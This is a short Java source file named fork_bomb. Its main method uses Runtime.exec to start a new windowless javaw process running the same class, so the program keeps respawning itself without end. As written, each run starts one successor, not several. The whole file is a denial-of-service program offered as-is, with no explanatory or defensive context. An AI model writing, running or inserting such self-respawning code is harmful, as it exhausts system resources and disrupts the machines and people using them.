public class fork_bomb
{
	public static void main(String[] args)
	{
		Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "fork_bomb"});
	}
}
